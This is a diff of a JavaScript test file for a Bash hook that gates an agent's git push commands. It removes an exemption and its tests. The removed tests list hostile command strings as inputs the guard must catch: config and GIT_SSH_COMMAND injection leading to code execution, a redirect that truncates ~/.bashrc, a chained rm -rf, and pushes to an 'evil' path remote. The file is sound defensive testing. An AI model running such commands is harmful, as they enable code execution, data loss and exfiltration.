@@ -66,142 +66,14 @@ test('git push always asks (publishing is /cad-land\'s call)', () => {
   assert.match(d.permissionDecisionReason, /cad-land/);
 });
 
-test('auto_close: a plain publish of the current non-protected branch is exempt (silent)', () => {
+test('auto_close true does not exempt any push - every push still asks', () => {
+  // The direct inversion of the removed exemption: git-guard carries NO push
+  // exemption. Even the exact shape that once passed silently under repo
+  // auto_close now asks. cad-land's sanctioned publish runs through the
+  // git-publish seam as a subprocess argv push this Bash hook never sees.
   const dir = project('cadence/v1.1.0-rc.2', { git: { auto_close: true } });
-  assert.equal(guard('git push -u origin cadence/v1.1.0-rc.2', dir), null);
-});
-
-test('auto_close: a push while HEAD is a protected branch still asks', () => {
-  const d = guard('git push origin main', project('main', { git: { auto_close: true } }));
-  assert.equal(d.permissionDecision, 'ask');
-});
-
-test('auto_close explicitly false: a feature-branch push still asks', () => {
-  const d = guard('git push -u origin cadence/v1.1.0-rc.2',
-    project('cadence/v1.1.0-rc.2', { git: { auto_close: false } }));
-  assert.equal(d.permissionDecision, 'ask');
-});
-
-test('auto_close: a --force push is not a plain publish and still asks', () => {
-  const d = guard('git push --force origin cadence/v1.1.0-rc.2',
-    project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
-  assert.equal(d.permissionDecision, 'ask');
-});
-
-test('auto_close: a src:dst refspec targeting a protected base still asks', () => {
-  const d = guard('git push origin cadence/v1.1.0-rc.2:main',
-    project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
-  assert.equal(d.permissionDecision, 'ask');
-});
-
-// The exemption is a whitelist: these push shapes are dangerous or unparseable
-// and must ask despite repo auto_close + HEAD on a non-protected feature branch.
-// (git decomposes -fu into -f -u and force-pushes; -d is --delete; a quoted
-// token parses differently from what the shell runs; --x=y flags can retarget.)
-for (const [label, command] of [
-  ['bundled short flags -fu (force+set-upstream)', 'git push -fu origin cadence/v1.1.0-rc.2'],
-  ['bundled short flags -uf (set-upstream+force)', 'git push -uf origin cadence/v1.1.0-rc.2'],
-  ['short alias -d (--delete)', 'git push -d origin cadence/v1.1.0-rc.2'],
-  ['quoted protected target "main"', 'git push origin "main"'],
-  ['quoted refspec cadence/x:main', 'git push origin "cadence/v1.1.0-rc.2:main"'],
-  ['--receive-pack=evil retarget', 'git push --receive-pack=evil origin cadence/v1.1.0-rc.2'],
-  ['--force-with-lease=origin/x', 'git push --force-with-lease=origin/x origin cadence/v1.1.0-rc.2'],
-]) {
-  test(`auto_close: whitelist rejects ${label} (asks)`, () => {
-    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
-    assert.notEqual(d, null);
-    assert.equal(d.permissionDecision, 'ask');
-  });
-}
-
-// A global option BEFORE `push` (config injection, alternate git-dir/namespace/
-// exec-path) can retarget the push destination or alter its ref context, so it
-// disqualifies the exemption even with repo auto_close + HEAD on the feature
-// branch. `-c remote.origin.pushurl=...` retargets to an attacker URL;
-// `-c core.sshCommand=...` is RCE; the sanctioned publish carries none of these.
-for (const [label, command] of [
-  ['-c remote.origin.pushurl injection', 'git -c remote.origin.pushurl=http://evil push origin cadence/v1.1.0-rc.2'],
-  ['-c core.sshCommand injection (RCE)', 'git -c core.sshCommand=x push origin cadence/v1.1.0-rc.2'],
-  ['--config-env pre-push global', 'git --config-env=X push origin cadence/v1.1.0-rc.2'],
-  ['--namespace pre-push global', 'git --namespace=other push origin cadence/v1.1.0-rc.2'],
-  ['--exec-path pre-push global', 'git --exec-path=/tmp push origin cadence/v1.1.0-rc.2'],
-]) {
-  test(`auto_close: a pre-push global option (${label}) disqualifies the exemption (asks)`, () => {
-    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
-    assert.notEqual(d, null);
-    assert.equal(d.permissionDecision, 'ask');
-  });
-}
-
-// The exemption fires ONLY for a single lone statement that starts with
-// `git push`. A leading env-var assignment (RCE via git's ssh transport), a
-// chained/compound statement, a pipe, or command substitution each smuggles
-// past a first plain-looking push, so all must ask despite repo auto_close +
-// HEAD on the feature branch.
-for (const [label, command] of [
-  ['GIT_SSH_COMMAND env prefix (RCE)', 'GIT_SSH_COMMAND=/tmp/x git push origin cadence/v1.1.0-rc.2'],
-  ['benign-looking FOO=bar env prefix', 'FOO=bar git push origin cadence/v1.1.0-rc.2'],
-  ['chained second push to a protected base', 'git push origin cadence/v1.1.0-rc.2; git push origin cadence/v1.1.0-rc.2:main'],
-  ['&& trailing destructive command', 'git push origin cadence/v1.1.0-rc.2 && rm -rf tmpdir'],
-  ['pipe to a trailing command', 'git push origin cadence/v1.1.0-rc.2 | tee log'],
-  ['command substitution $(...) argument', 'git push origin $(echo cadence/v1.1.0-rc.2)'],
-  ['backtick command substitution', 'git push origin `echo x`'],
-]) {
-  test(`auto_close: whitelist rejects ${label} (asks)`, () => {
-    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
-    assert.notEqual(d, null);
-    assert.equal(d.permissionDecision, 'ask');
-  });
-}
-
-// The exemption is the fully explicit shape `git push [safe-flags]
-// <remote-name> <current-branch>` and nothing looser (tightened after the
-// blocking security review). A shell metacharacter glued to a token survives
-// word-splitting (`origin>~/.bashrc` is ONE word, yet the shell honors the `>`
-// and truncates the file); a path remote exfiltrates the branch to an
-// unvetted destination; an implicit push (bare `git push`, or no branch)
-// publishes ALL matching branches under push.default=matching, protected ones
-// included. All must ask despite repo auto_close + HEAD on the feature branch.
-for (const [label, command] of [
-  ['redirect glued to the remote token', 'git push origin>~/.bashrc cadence/v1.1.0-rc.2'],
-  ['separate redirect token', 'git push origin cadence/v1.1.0-rc.2 >/tmp/x'],
-  ['trailing & (background)', 'git push origin cadence/v1.1.0-rc.2 &'],
-  ['filesystem-path remote /tmp/evil', 'git push /tmp/evil cadence/v1.1.0-rc.2'],
-  ['relative-path remote ../evil', 'git push ../evil cadence/v1.1.0-rc.2'],
-  ['bare git push (implicit remote+branch)', 'git push'],
-  ['git push origin (implicit branch)', 'git push origin'],
-  ['extra third positional', 'git push origin cadence/v1.1.0-rc.2 extra'],
-]) {
-  test(`auto_close: explicit-shape whitelist rejects ${label} (asks)`, () => {
-    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
-    assert.notEqual(d, null);
-    assert.equal(d.permissionDecision, 'ask');
-  });
-}
-
-test('auto_close: a benign combined short flag -uq stays exempt (silent)', () => {
-  const dir = project('cadence/v1.1.0-rc.2', { git: { auto_close: true } });
-  assert.equal(guard('git push -uq origin cadence/v1.1.0-rc.2', dir), null);
-  assert.equal(guard('git push -u -q origin cadence/v1.1.0-rc.2', dir), null);
-});
-
-test('auto_close: explicit plain publishes (plain and -u) stay exempt (silent)', () => {
-  const dir = project('cadence/v1.1.0-rc.2', { git: { auto_close: true } });
-  assert.equal(guard('git push origin cadence/v1.1.0-rc.2', dir), null);
-  assert.equal(guard('git push -u origin cadence/v1.1.0-rc.2', dir), null);
-});
-
-test('auto_close set ONLY in the global layer never mutes the guard (repo-layer read)', () => {
-  // Repo config omits auto_close; a global auto_close must not exempt the push.
-  const globalCfg = join(mkdtempSync(join(tmpdir(), 'cad-guard-glob-')), 'g.json');
-  writeFileSync(globalCfg, JSON.stringify({ git: { auto_close: true } }));
-  const dir = project('cadence/v1.1.0-rc.2', { git: {} });
-  const stdout = execFileSync('node', [GUARD], {
-    encoding: 'utf8',
-    input: JSON.stringify({ tool_input: { command: 'git push -u origin cadence/v1.1.0-rc.2' }, cwd: dir }),
-    env: { ...process.env, CADENCE_GLOBAL_CONFIG: globalCfg },
-  }).trim();
-  const d = stdout ? JSON.parse(stdout).hookSpecificOutput : null;
+  const d = guard('git push -u origin cadence/v1.1.0-rc.2', dir);
+  assert.notEqual(d, null);
   assert.equal(d.permissionDecision, 'ask');
 });
 
